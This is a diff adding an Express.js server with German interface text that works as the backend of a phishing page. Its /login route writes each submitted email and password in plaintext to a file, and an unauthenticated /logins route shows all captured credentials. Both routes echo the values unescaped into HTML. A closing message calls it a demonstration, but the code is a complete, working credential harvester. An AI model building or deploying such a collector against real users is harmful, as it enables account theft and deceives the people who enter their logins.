@@ -1,0 +1,34 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path');
+
+const app = express();
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static('public'));
+app.use('/admin', express.static('admin'));
+
+const LOG_FILE = 'logins.txt';
+
+app.post('/login', (req, res) => {
+  const { email, password } = req.body;
+
+  const logEntry = `E-Mail: ${email} | Passwort: ${password} | Zeit: ${new Date().toLocaleString()}\n`;
+  fs.appendFileSync(LOG_FILE, logEntry);
+
+  res.send(`
+    <h3>Danke für Ihre Eingabe!</h3>
+    <p>Dies war nur eine Demonstration. Keine Daten wurden an Dritte übermittelt.</p>
+    <a href="/">Zurück zur Login-Seite</a>
+  `);
+});
+
+app.get('/logins', (req, res) => {
+  const logins = fs.readFileSync(LOG_FILE, 'utf8');
+  res.send(`<pre>${logins}</pre><a href="/">Zurück</a>`);
+});
+
+const PORT = 3000;
+app.listen(PORT, () => {
+  console.log(`Server läuft auf http://localhost:${PORT}`);
+});
